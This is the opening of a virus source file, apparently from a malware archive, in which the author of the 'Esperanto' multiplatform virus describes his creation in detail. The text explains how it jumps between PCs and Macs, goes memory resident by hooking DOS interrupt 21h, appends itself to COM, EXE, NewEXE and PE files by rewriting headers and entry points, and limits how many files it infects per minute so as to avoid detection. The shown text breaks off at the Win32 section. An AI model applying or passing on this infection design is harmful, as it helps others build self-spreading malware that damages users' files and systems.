<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Esperanto.4733 - esperanto.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ</span><span class="sc0">
</span><span class="sc1">;   ³        /\/\/\/\/ Esperanto \/\/\/\/\        ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ³        written by Mister Sandman/29A         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ³  A MULTIPROCESSOR and MULTIPLATFORM virus   ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 0. Introduction</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Welcome to Esperanto, world's first multiprocessor and multiplatform virus</span><span class="sc0">
</span><span class="sc1">; ever, which is (pretty obviously) my best virus so far. It took me several</span><span class="sc0">
</span><span class="sc1">; months to write it, assemble the whole thing, and put it together into one</span><span class="sc0">
</span><span class="sc1">; only file, id est, the virus binary. In every moment i tried to write such</span><span class="sc0">
</span><span class="sc1">; a clear, modulized, easily understandable code to the detriment of optimi-</span><span class="sc0">
</span><span class="sc1">; zation. However i'm conscious it's necessary to write a previous deep ana-</span><span class="sc0">
</span><span class="sc1">; lysis so everybody may clearly understand the 100% of its functioning.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 1. Processors/platforms/objects</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Esperanto is able to run in three different kinds of processors, which are</span><span class="sc0">
</span><span class="sc1">; Intel 80x86 (used in common PCs), Motorola 680x0 (used in old Apple Macin-</span><span class="sc0">
</span><span class="sc1">; tosh computers and in new Macintosh Performa) and PowerPC 6xx (used in new</span><span class="sc0">
</span><span class="sc1">; Power Macintosh and PowerBook computers).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Inside each of these processors  it is able  to work  in several different</span><span class="sc0">
</span><span class="sc1">; platforms, thus, in Intel  80x86 processors it will run under DOS, Windows</span><span class="sc0">
</span><span class="sc1">; 3.1x, Windows95, WindowsNT and Win32s, and in Motorola and PowerPC it will</span><span class="sc0">
</span><span class="sc1">; run under any version of Mac OS (since early 6.x up to the recently relea-</span><span class="sc0">
</span><span class="sc1">; sed Mac OS 8, which  has been fully  tested under); albeit Amiga computers</span><span class="sc0">
</span><span class="sc1">; use also Motorola processors, Esperanto will not be able to work in them.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And now finally, depending on the platform Esperanto is being executed in,</span><span class="sc0">
</span><span class="sc1">; it will infect several  different objects; when running in DOS and Windows</span><span class="sc0">
</span><span class="sc1">; 3.1x it will infect: COM, EXE, NewEXE, and PE files. Under Windows95, Win-</span><span class="sc0">
</span><span class="sc1">; dowsNT and Win32s (Win32 from now onwards) it will infect COM, EXE, and PE</span><span class="sc0">
</span><span class="sc1">; files. Finally, when run under Mac OS, it will infect Mac OS applications,</span><span class="sc0">
</span><span class="sc1">; including  extensions, control panels, the System File, the Mac OS Finder,</span><span class="sc0">
</span><span class="sc1">; the DA Handler, and, if available, the Desktop File (only in Mac OS &lt;7).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The following diagram is pretty useful to understand the above:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄ DOS ÄÄÄÄÄÄ COM, EXE, NewEXE, PE</span><span class="sc0">
</span><span class="sc1">;        ÚÄÄÄÄÄÄÄÄÄ³ Intel 80x86 ÃÄÄÄÅÄ Win 3.1x Ä COM, EXE, NewEXE, PE</span><span class="sc0">
</span><span class="sc1">;        ³          ³    (PCs)    ³   ÀÄ Win32 ÄÄÄÄ COM, EXE, PE</span><span class="sc0">
</span><span class="sc1">;        ³          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;        ³         ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄÄÄÁÄÄÄÄÄ¿   ³ Motorola 680x0 ³</span><span class="sc0">
</span><span class="sc1">;  ³ Esperanto ÃÄÄ³   (Old Macs)   ÃÄ¿            ÚÄ Mac OS Apps</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÄÄÂÄÄÄÄÄÙ   ³ (Mac Performa) ³ ³            ÃÄ System File</span><span class="sc0">
</span><span class="sc1">;        ³         ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ ÃÄ Mac OS ÄÄÅÄ Mac OS Finder</span><span class="sc0">
</span><span class="sc1">;        ³          ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³            ÃÄ DA Handler</span><span class="sc0">
</span><span class="sc1">;        ³          ³ PowerPC 6xx  ³  ³            ÀÄ Desktop File</span><span class="sc0">
</span><span class="sc1">;        ÀÄÄÄÄÄÄÄÄÄ³ (Power Macs) ÃÄÄÙ                (Mac OS &lt;7)</span><span class="sc0">
</span><span class="sc1">;                   ³ (PowerBooks) ³</span><span class="sc0">
</span><span class="sc1">;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.0. Internal structure</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Esperanto gets the compatibility  and the  portability between these three</span><span class="sc0">
</span><span class="sc1">; different processors by means of the strategyc  use of its internal struc-</span><span class="sc0">
</span><span class="sc1">; ture, so it's completely necessary to see what does it consist on in order</span><span class="sc0">
</span><span class="sc1">; to understand the way Esperanto works.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Maybe the first question which comes up to your  mind is something similar</span><span class="sc0">
</span><span class="sc1">; to "how the fuck  can it jump from PCs to Macintoshes?". Theoretically, it</span><span class="sc0">
</span><span class="sc1">; would be impossible, as PC applications are compiled for Intel processors,</span><span class="sc0">
</span><span class="sc1">; which use different opcodes than the ones used by Motorola and/or PowerPC.</span><span class="sc0">
</span><span class="sc1">; But practically it was  possible, by means  of some  tricks. I will try to</span><span class="sc0">
</span><span class="sc1">; explain them all point by point.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; a) How can a PC executable file jump into a Mac? Mac OS uses something si-</span><span class="sc0">
</span><span class="sc1">;    milar to drivers, called  "extensions". Since many  time ago Mac OS in-</span><span class="sc0">
</span><span class="sc1">;    cludes an  extension  called "PC Exchange", which is  loaded by default</span><span class="sc0">
</span><span class="sc1">;    and is able to read and write any PC disk. Since then lots of Macintosh</span><span class="sc0">
</span><span class="sc1">;    users, by means of DOS and Win emulators, use lots of PC files in their</span><span class="sc0">
</span><span class="sc1">;    Macs. The first step is, as you can see, done.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; b) How can Esperanto infect under Mac OS? well, this requires some theory.</span><span class="sc0">
</span><span class="sc1">;    Mac OS executable files consist  on definite-purpose resources (such as</span><span class="sc0">
</span><span class="sc1">;    CODE, MDEF (Menu DEFinition), BNDL (bundle), etc). Every executable fi-</span><span class="sc0">
</span><span class="sc1">;    le in Mac OS has a resource index or relocation at its end, and this is</span><span class="sc0">
</span><span class="sc1">;    what the operating system looks for in  order to distinguish executable</span><span class="sc0">
</span><span class="sc1">;    and non-executable files. One of these resource indexes has been "arti-</span><span class="sc0">
</span><span class="sc1">;    ficially" added to the end of the Esperanto body. This item does not do</span><span class="sc0">
</span><span class="sc1">;    anything under any PC platform, but it does force Mac OS to execute in-</span><span class="sc0">
</span><span class="sc1">;    fected PC programs in Macs. When going to run  any of these PC programs</span><span class="sc0">
</span><span class="sc1">;    under one of  the known DOS or Win emulators, Mac OS will recognize the</span><span class="sc0">
</span><span class="sc1">;    executable format and then will run the infected file with no emulation</span><span class="sc0">
</span><span class="sc1">;    so Esperanto will go memory resident under Mac OS. After this, the con-</span><span class="sc0">
</span><span class="sc1">;    trol will be given back to the Intel emulator and then the infected fi-</span><span class="sc0">
</span><span class="sc1">;    le will be normally executed, being possible to stay memory resident in</span><span class="sc0">
</span><span class="sc1">;    the virtual memory used by the DOS or Win emulator as well.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; c) But aren't the opcodes of each processor different? indeed. And that is</span><span class="sc0">
</span><span class="sc1">;    why Esperanto has a specific infection routine  for Mac OS applications</span><span class="sc0">
</span><span class="sc1">;    totally written and compiled in Motorola 680x0 code. This submodule was</span><span class="sc0">
</span><span class="sc1">;    incrusted into the main Esperanto body and is pointed by the previously</span><span class="sc0">
</span><span class="sc1">;    mentioned resource index. When an infected application is run in Mac OS</span><span class="sc0">
</span><span class="sc1">;    after having been recognized as an executable file the operating system</span><span class="sc0">
</span><span class="sc1">;    first checks the resource  index. A pointer  to a MDEF resource will be</span><span class="sc0">
</span><span class="sc1">;    found in it, and then  the execution will jump straight to the starting</span><span class="sc0">
</span><span class="sc1">;    offset pointed to in the resource index, where the  so called "jump ta-</span><span class="sc0">
</span><span class="sc1">;    ble" is supposed to be. This  jump  table  is another characteristic of</span><span class="sc0">
</span><span class="sc1">;    Mac OS applications, and its mission consists on managing the hierarchy</span><span class="sc0">
</span><span class="sc1">;    of the execution  of the different resources in a file. This jump table</span><span class="sc0">
</span><span class="sc1">;    does not actually exist in Esperanto; instead of it there is a jmp ins-</span><span class="sc0">
</span><span class="sc1">;    truction (Intel-opcoded) which in PCs will jump to the virus real start</span><span class="sc0">
</span><span class="sc1">;    and in Macintoshes will be interpreted as non-sense data, so it will be</span><span class="sc0">
</span><span class="sc1">;    skipped... until the next instruction, a Motorola one, is reached. That</span><span class="sc0">
</span><span class="sc1">;    is the first instruction of the Mac OS module which, consequently, will</span><span class="sc0">
</span><span class="sc1">;    be run as execution goes on. Our objective is done.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; d) And how can the virus run in PowerPC processors? since these processors</span><span class="sc0">
</span><span class="sc1">;    are used in Power Macintosh and PowerBook  computers, in Apple they had</span><span class="sc0">
</span><span class="sc1">;    to look for some kind  of compatibility between old applications (which</span><span class="sc0">
</span><span class="sc1">;    were compiled for Motorola) and  the new processors, so they eventually</span><span class="sc0">
</span><span class="sc1">;    came up with the idea  of including a Motorola code emulator inside the</span><span class="sc0">
</span><span class="sc1">;    new Mac OS kernel. Since then there's a full compatibility between both</span><span class="sc0">
</span><span class="sc1">;    processors and their applications, and that's why Esperanto is able too</span><span class="sc0">
</span><span class="sc1">;    to work in PowerPC-based machines which use Mac OS.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; e) How can Esperanto jump from Macs to PCs? also very easy. The virus will</span><span class="sc0">
</span><span class="sc1">;    infect every PC file it finds in the DOS/Win emulator and as soon as o-</span><span class="sc0">
</span><span class="sc1">;    ne of these files is copied to a PC the work will be done. And remember</span><span class="sc0">
</span><span class="sc1">;    there's no necessity of any floppy disks, as it's usual to find PC com-</span><span class="sc0">
</span><span class="sc1">;    puters connected to Macintoshes by networking means. That's why none of</span><span class="sc0">
</span><span class="sc1">;    the "foreign" infections (of Mac apps in PC, and of PC files in Mac OS)</span><span class="sc0">
</span><span class="sc1">;    was included in the virus, as they would be a loss of bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Once this all is understood it  is much simpler to understand the internal</span><span class="sc0">
</span><span class="sc1">; structure of the virus. Esperanto consists  on four  different modules and</span><span class="sc0">
</span><span class="sc1">; four entry points. There is a specific  virus module for Mac OS, DOS, Win,</span><span class="sc0">
</span><span class="sc1">; and Win32. And there is one entry point for each of them: the first one is</span><span class="sc0">
</span><span class="sc1">; "universal", it's the one we've just described above. It is valid for COM,</span><span class="sc0">
</span><span class="sc1">; EXE and Mac OS apps, and it is formed  only by a simple "jmp" instruction,</span><span class="sc0">
</span><span class="sc1">; whose mission consists on "discriminating" the processor it is working un-</span><span class="sc0">
</span><span class="sc1">; der and, depending on that, distributing the execution point either to the</span><span class="sc0">
</span><span class="sc1">; start of the  Mac OS module or to the start of the DOS one. The second en-</span><span class="sc0">
</span><span class="sc1">; try point is the one straight reached in  this last  case, and it is valid</span><span class="sc0">
</span><span class="sc1">; only  for COM and EXE files. The  third entry point is the one used by the</span><span class="sc0">
</span><span class="sc1">; Windows 3.1x module, and finally the fourth deals with the Win32 code.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Again, the use of a diagram will make things much simpler to understand:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;          ÚÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;        ÚÄÅÄÄÄÄÄÄÅÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÂÄÄ Universal entry point</span><span class="sc0">
</span><span class="sc1">;        ³ ÀÄÄÄÄÄ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÃÄÄ Mac OS entry point</span><span class="sc0">
</span><span class="sc1">;        ³        ³ÛÛÛÛ Mac OS ÛÛÛÛ³</span><span class="sc0">
</span><span class="sc1">;        ³        ³ÛÛÛÛ module ÛÛÛÛ³</span><span class="sc0">
</span><span class="sc1">;        ³        ³ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ³</span><span class="sc0">
</span><span class="sc1">;        ÀÄÄÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ COM/EXE entry point</span><span class="sc0">
</span><span class="sc1">;                 ³±± DOS module ±±³</span><span class="sc0">
</span><span class="sc1">;                 ³±±(not memres)±±³</span><span class="sc0">
</span><span class="sc1">;          ÚÄÄÄÄÄÄ´±±±±±±±±±±±±±±±±³</span><span class="sc0">
</span><span class="sc1">;        ÚÄÅÄÄÄÄÄÄ´°°°°°°°°°°°°°°°°ÃÄÄ NewEXE entry point</span><span class="sc0">
</span><span class="sc1">;        ³ ³      ³°° Win module °°³</span><span class="sc0">
</span><span class="sc1">;        ³ ³      ³°°°°°°°°°°°°°°°°³</span><span class="sc0">
</span><span class="sc1">;        ³ ÀÄÄÄÄÄ³±±±±±±±±±±±±±±±±ÃÄÄ DOS memory resident code</span><span class="sc0">
</span><span class="sc1">;        ÀÄÄÄÄÄÄÄ³±± DOS module ±±ÃÄÄ 16-bit infection routines</span><span class="sc0">
</span><span class="sc1">;                 ³±±(memory res)±±³</span><span class="sc0">
</span><span class="sc1">;                 ³±±±±±±±±±±±±±±±±³</span><span class="sc0">
</span><span class="sc1">;                 ³²²²²²²²²²²²²²²²²ÃÄÄ PE entry point</span><span class="sc0">
</span><span class="sc1">;                 ³²² W32 module ²²³</span><span class="sc0">
</span><span class="sc1">;                 ³²²²²²²²²²²²²²²²²³</span><span class="sc0">
</span><span class="sc1">;                 ³++++++++++++++++ÃÄÄ Data buffer</span><span class="sc0">
</span><span class="sc1">;                 ³+++++ Data +++++³</span><span class="sc0">
</span><span class="sc1">;                 ³++++++++++++++++³</span><span class="sc0">
</span><span class="sc1">;                 ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.1. The Mac OS module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This module (Motorola-opcoded) was written and compiled in a Mac computer.</span><span class="sc0">
</span><span class="sc1">; It has the format of a MDEF resource. It's executed every time an infected</span><span class="sc0">
</span><span class="sc1">; application is run under Mac OS. When this happens the module will perform</span><span class="sc0">
</span><span class="sc1">; the System File infection, so that the virus will be loaded every time the</span><span class="sc0">
</span><span class="sc1">; user boots from his hard disk. Then it will give control back to the host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; From this moment onwards the virus will rapidly spread all over the system</span><span class="sc0">
</span><span class="sc1">; in a "chain" process: after its host has been run, the System File (remem-</span><span class="sc0">
</span><span class="sc1">; ber, previously infected) will call and then infect the Mac OS Finder. The</span><span class="sc0">
</span><span class="sc1">; Finder, in its turn, will infect *any* accessed file (findfirst, findnext,</span><span class="sc0">
</span><span class="sc1">; open, close, chmod...), and this includes the DA Handler, the Desktop File</span><span class="sc0">
</span><span class="sc1">; (if available, only in Mac OS &lt;7), control panels, extensions, etc.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infection consists on simply adding a new MDEF resource to the victims and</span><span class="sc0">
</span><span class="sc1">; copying the whole viral code into it, setting execution priviledges to the</span><span class="sc0">
</span><span class="sc1">; resource with ID=0. Esperanto will not go memory resident twice.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; I think it would be fair to say that this was probably the part of the vi-</span><span class="sc0">
</span><span class="sc1">; rus whose writing i enjoyed most as i had to develop it all myself because</span><span class="sc0">
</span><span class="sc1">; there are not any tutorials on Mac OS infection (as far as i know).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.2.0. The DOS module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This module uses 16-bit Intel code, and  was specifically  designed to run</span><span class="sc0">
</span><span class="sc1">; in DOS. It has the peculiarity of being divided into two different chunks,</span><span class="sc0">
</span><span class="sc1">; each of them  with a different mission. Now i'll try to describe the func-</span><span class="sc0">
</span><span class="sc1">; tioning and the behavior of both of these DOS submodules.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.2.1. The DOS runtime module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This submodule is executed every time  an infected COM or EXE file is run.</span><span class="sc0">
</span><span class="sc1">; When this happens, the DOS runtime module will try to perform two actions:</span><span class="sc0">
</span><span class="sc1">; first, become memory resident by hooking interrupt 21h; and second, resto-</span><span class="sc0">
</span><span class="sc1">; re its host in order to let it be executed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The residency method is completely standard, as the virus first checks for</span><span class="sc0">
</span><span class="sc1">; its presence in memory (in order to not to go resident twice), and if this</span><span class="sc0">
</span><span class="sc1">; is ok  then creates a new MCB, sets it as a system one used by DOS, copies</span><span class="sc0">
</span><span class="sc1">; its code into it and then jumps to this copy, so no ëelta-offset is longer</span><span class="sc0">
</span><span class="sc1">; needed. Once this happens it will hook interrupt 21h, setting the new vec-</span><span class="sc0">
</span><span class="sc1">; tor to the start of  the DOS memory resident  module, and  then will check</span><span class="sc0">
</span><span class="sc1">; for the file format of its host, in order to rebuild and jump to it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.2.2. The DOS memory resident module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This submodule is executed every time the interrupt 21h is called once the</span><span class="sc0">
</span><span class="sc1">; virus has previously gone memory resident. Esperanto intercepts only three</span><span class="sc0">
</span><span class="sc1">; functions: its own interrupt service (a ":)" smiley), the findfirst servi-</span><span class="sc0">
</span><span class="sc1">; ce (4eh) and the findnext service (4fh). If the int call does not hold any</span><span class="sc0">
</span><span class="sc1">; of these services as request, the virus will jump to the original int 21h.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Instead, Esperanto will perform several actions when having intercepted a-</span><span class="sc0">
</span><span class="sc1">; ny of the functions in hooks. When the value held in AX is equal to 3a29h,</span><span class="sc0">
</span><span class="sc1">; which stands for a ":)" smiley, it will increment AH so the eyes will turn</span><span class="sc0">
</span><span class="sc1">; into a ";)" wink. This is used for the residency check to not to go memory</span><span class="sc0">
</span><span class="sc1">; resident twice. The execution will then jump to the original interrupt.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If the value held in AH is equal to 4eh or 4fh (findfirst/findnext), Espe-</span><span class="sc0">
</span><span class="sc1">; ranto will try to set up the  file for its infection. The virus will first</span><span class="sc0">
</span><span class="sc1">; store the full path and the filename, and later will check  its extension.</span><span class="sc0">
</span><span class="sc1">; If the extension is .COM or .EXE, Esperanto will continue running the cor-</span><span class="sc0">
</span><span class="sc1">; responding  routines encharged  of examining the file and determining whe-</span><span class="sc0">
</span><span class="sc1">; ther it is infectable or not. Otherwise  it will hand the control over the</span><span class="sc0">
</span><span class="sc1">; original interrupt service by means of a "retf" instruction.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The 16-bit infection routines</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; For the case the latter didn't happen, Esperanto is about to check the fi-</span><span class="sc0">
</span><span class="sc1">; le in DS:DX in order to know if it is worth to be infected or not. But be-</span><span class="sc0">
</span><span class="sc1">; fore doing any specific file check (which would depend  on its extension),</span><span class="sc0">
</span><span class="sc1">; the virus does a call to the "system_checks" routine. This routine is kind</span><span class="sc0">
</span><span class="sc1">; of an "infection limiter", used in order to avoid the virus presence being</span><span class="sc0">
</span><span class="sc1">; unveiled because of  the system slowdown which  would happen if there were</span><span class="sc0">
</span><span class="sc1">; no limits when infecting files. Thus, Esperanto will infect from 0 up to 3</span><span class="sc0">
</span><span class="sc1">; files per (a maximum of a) minute. If the "system_checks" routine does not</span><span class="sc0">
</span><span class="sc1">; return a 0 in AH, then Esperanto  has not infected 3 files yet in the same</span><span class="sc0">
</span><span class="sc1">; minute, so it may keep on seeking for victims.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now, if the possible victim  is a COM file, the virus will check first for</span><span class="sc0">
</span><span class="sc1">; its infection mark (a ";)" smiley) in the offset 4 of the file. If this is</span><span class="sc0">
</span><span class="sc1">; ok then it will just assure itself the file is bigger than 5733 (the virus</span><span class="sc0">
</span><span class="sc1">; size+1000) and smaller than 59802 (65535-the virus size-1000). If the file</span><span class="sc0">
</span><span class="sc1">; has passed all the tests then it's good to be infected: 4733 bytes will be</span><span class="sc0">
</span><span class="sc1">; appended to its end and it will have a new 5 bytes long header (jmp+";)").</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The conditions required for EXE files are different. The virus will see if</span><span class="sc0">
</span><span class="sc1">; the first word in the file is MZ or ZM. Later it will check for its infec-</span><span class="sc0">
</span><span class="sc1">; tion mark, any overlay, and the presence of PkLite. If nothing goes bad it</span><span class="sc0">
</span><span class="sc1">; will then skip the file if it's smaller than 5733 (Esperanto+1000) and fi-</span><span class="sc0">
</span><span class="sc1">; nally will see if it is a Windows EXE file. For the case it is not the vi-</span><span class="sc0">
</span><span class="sc1">; rus will modify CS, IP, SS and SP besides other pointers in the MZ header,</span><span class="sc0">
</span><span class="sc1">; and then append itself to the end of the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; If it is about a Windows EXE file, it will decrement the pointer in 3ch to</span><span class="sc0">
</span><span class="sc1">; the new EXE header by 8, and then rewrite the MZ header. This new EXE hea-</span><span class="sc0">
</span><span class="sc1">; der will be read (512 bytes) and then Esperanto will check for the NE (for</span><span class="sc0">
</span><span class="sc1">; NewEXEs) or PE (for PEs) mark. If a different  mark (LE, LX...)  is found,</span><span class="sc0">
</span><span class="sc1">; the file will be rejected, and the original header rebuilt. If it is about</span><span class="sc0">
</span><span class="sc1">; a NewEXE, the virus will check straight for the gangload area. If it is ok</span><span class="sc0">
</span><span class="sc1">; then Esperanto will infect the file: first it will update all the pointers</span><span class="sc0">
</span><span class="sc1">; related with the segment table, as it will be shifted. Later, the gangload</span><span class="sc0">
</span><span class="sc1">; area will be killed for compatibility, and the  new CS:IP will be set. Fi-</span><span class="sc0">
</span><span class="sc1">; nally the NE header and the segment table will be shifted by 8 and the vi-</span><span class="sc0">
</span><span class="sc1">; ral code plus the relocation item appended to the end of the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Finally, if the file turns out to be a PE the virus will read again the MZ</span><span class="sc0">
</span><span class="sc1">; header of the file and readd 8 to the pointer in 3ch. A page from the off-</span><span class="sc0">
</span><span class="sc1">; set pointed by the latter will be read again (ie, the PE header), and then</span><span class="sc0">
</span><span class="sc1">; the checks will start again. These consist on checking if the file is exe-</span><span class="sc0">
</span><span class="sc1">; cutable and if it's not a DLL. After  this, Esperanto looks for the import</span><span class="sc0">
</span><span class="sc1">; section in the file, reads it, and then looks  for the KERNEL32.DLL module</span><span class="sc0">
</span><span class="sc1">; descriptor. Files which do not import any API from it will consequently be</span><span class="sc0">
</span><span class="sc1">; discarded, as well  as binded files. The final  step before infection con-</span><span class="sc0">
</span><span class="sc1">; sists  on storing in  a dynamic variable the RVAs for the GetModuleHandleA</span><span class="sc0">
</span><span class="sc1">; and GetProcAddress APIs. Once these steps are done the victim is ready for</span><span class="sc0">
</span><span class="sc1">; infection. The  virus will  attach itself as an extension of the last sec-</span><span class="sc0">
</span><span class="sc1">; tion in the file, and then will modify the AddressOfEntryPoint field so it</span><span class="sc0">
</span><span class="sc1">; points to the start of the virus, the section characteristics to exec/read</span><span class="sc0">
</span><span class="sc1">; /write, and the SizeOfImage field. And, of course, the virus will then ap-</span><span class="sc0">
</span><span class="sc1">; pend its body to the end of the file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.3. The Windows 3.1x module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This module is executed every time an infected NewEXE file is run. It will</span><span class="sc0">
</span><span class="sc1">; first of all get an alias selector for CS and point it with DS. As soon as</span><span class="sc0">
</span><span class="sc1">; this is done it will use its own runtime routines in order to look for so-</span><span class="sc0">
</span><span class="sc1">; me files (COM and EXE) to infect. To save bytes, the module shares the sa-</span><span class="sc0">
</span><span class="sc1">; me infection routines used  by the DOS module (read the "The 16-bit infec-</span><span class="sc0">
</span><span class="sc1">; tion routines" point for further information). As soon as the maximum num-</span><span class="sc0">
</span><span class="sc1">; ber of files to infect (according to  the virus limiter) is reached, Espe-</span><span class="sc0">
</span><span class="sc1">; ranto will jump to the original CS:IP of its host.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 2.4. The Win32 module</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; This last module is executed every time an infected PE file is run. It was</span><span class="sc0">
